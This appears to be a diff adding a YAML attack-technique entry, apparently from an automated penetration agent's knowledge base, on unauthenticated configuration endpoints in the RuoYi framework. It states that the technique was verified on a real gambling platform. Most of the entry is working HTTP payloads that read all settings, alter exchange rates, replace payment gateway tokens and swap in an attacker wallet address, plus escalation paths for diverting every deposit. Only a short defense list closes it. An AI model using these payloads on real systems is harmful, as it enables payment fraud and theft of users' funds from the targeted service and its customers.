@@ -1,0 +1,97 @@
+id: "api-bypass-ruoyi-unauth-config-write"
+name: "RuoYi自定义配置接口未授权读写"
+category: "api-bypass"
+subcategory: "unauth-config"
+severity: "critical"
+
+description: |
+  RuoYi框架中自定义业务表(非sys_config)的PUT接口可能未纳入Spring Security
+  认证拦截链。攻击者无需凭证即可读取全部系统配置并修改任意字段，包括支付
+  密钥、钱包地址、汇率费率等核心业务参数。本技术在对某博彩平台的实战
+  中发现并验证。
+  
+  漏洞端点: PUT /prod-api/bet/system/setting/updateSysBasicInfo
+  读端点:   GET /prod-api/bet/system/setting/getBasicInfo
+           GET /prod-api/bet/system/setting/getSysSetting
+
+trigger_signals:
+  - "REST API响应头包含X-Powered-By或框架指纹"
+  - "PUT请求返回200但未携带Authorization头"
+  - "GET某个配置端点返回支付密钥/Token等敏感字段"
+  - "框架识别为RuoYi(版本<=3.9.0)"
+  - "存在/prod-api/或/dev-api/等API前缀"
+
+payloads:
+  - technique: "读取全量配置"
+    payload: |
+      GET /prod-api/bet/system/setting/getBasicInfo HTTP/1.1
+      Host: target
+    note: "无需任何认证头"
+  
+  - technique: "写入配置(修改汇率)"
+    payload: |
+      PUT /prod-api/bet/system/setting/updateSysBasicInfo HTTP/1.1
+      Host: target
+      Content-Type: application/json
+      
+      {"usdtToCnyRate": 10000}
+    note: "返回success=True且回读验证一致。小字段逐个改可绕过校验"
+  
+  - technique: "写入配置(替换支付密钥)"
+    payload: |
+      PUT /prod-api/bet/system/setting/updateSysBasicInfo HTTP/1.1
+      Host: target
+      Content-Type: application/json
+      
+      {"okpayMerchantId": "37241", "okpayToken": "new_token"}
+    note: "替换后所有充值流入攻击者商户"
+  
+  - technique: "写入配置(替换收款地址)"
+    payload: |
+      PUT /prod-api/bet/system/setting/updateSysBasicInfo HTTP/1.1
+      Host: target
+      Content-Type: application/json
+      
+      {"usdtTrc20Url": "TYourWalletAddress"}
+    note: "前端显示改为攻击者地址，但后端监控仍用旧地址(缓存问题)"
+
+success_indicators:
+  - "HTTP 200 + {\"success\":true,\"code\":200}"
+  - "回读GET端点确认值已变更"
+  - "配置变更影响业务行为(如汇率变化导致充值到账金额不同)"
+
+prerequisites:
+  - "目标使用RuoYi框架且存在自定义SysBasicInfo类型表"
+  - "该表对应的Controller未在SecurityConfig中配置认证规则"
+  - "PUT/POST方法未被全局拦截"
+  - "Content-Type: application/json被接受"
+
+upgrade_paths:
+  - "替换支付网关密钥 → 所有充值流入攻击者账户"
+  - "修改汇率/费率 → 操纵用户资产价值"
+  - "修改钱包地址 → 配合后端缓存过期后劫持充值"
+  - "关闭IP限制/安全开关 → 降低后续攻击难度"
+  - "结合验证码绕过 → 注册账号 + 提现攻击"
+
+defense:
+  - "SecurityConfig中对所有/prod-api/**添加认证拦截(custom().authenticated())"
+  - "敏感配置字段(密钥/Token)不应通过前端API返回"
+  - "配置修改操作添加操作日志和二次确认"
+  - "支付网关密钥使用独立存储(如Vault/环境变量)不存入业务数据库"
+
+sources:
+  - agent: "黑骡 v1.1.0"
+    date: "2026-07-21"
+  - ref: "CWE-306: Missing Authentication for Critical Function"
+  - ref: "CWE-200: Exposure of Sensitive Information"
+
+tools:
+  - "curl"
+  - "Python requests"
+
+confidence: "high"
+
+limitations:
+  - "需要目标存在自定义SysBasicInfo表(非RuoYi标准表)"
+  - "配置写入即时生效但后端缓存可能有延迟(默认30分钟TTL)"
+  - "全量字段写入可能触发参数校验(需逐个字段修改)"
